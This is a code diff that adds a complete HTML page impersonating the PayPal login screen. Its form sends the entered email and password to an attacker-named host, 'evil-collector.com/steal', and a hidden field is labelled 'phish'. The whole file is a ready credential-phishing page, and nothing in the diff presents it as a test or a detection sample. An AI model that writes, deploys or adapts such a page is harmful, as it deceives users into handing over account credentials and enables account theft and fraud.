@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>PayPal - Log in to your account</title></head>
+<body>
+  <h1>PayPal</h1>
+  <p>Log in to your PayPal account</p>
+  <form method="POST" action="https://evil-collector.com/steal">
+    <input type="text" name="email" placeholder="Email address" />
+    <input type="password" name="password" placeholder="Password" />
+    <input type="hidden" name="session" value="abc123" />
+    <input type="hidden" name="redirect" value="paypal.com" />
+    <input type="hidden" name="token" value="xyz789" />
+    <input type="hidden" name="source" value="phish" />
+    <button type="submit">Log In</button>
+  </form>
+</body>
+</html>
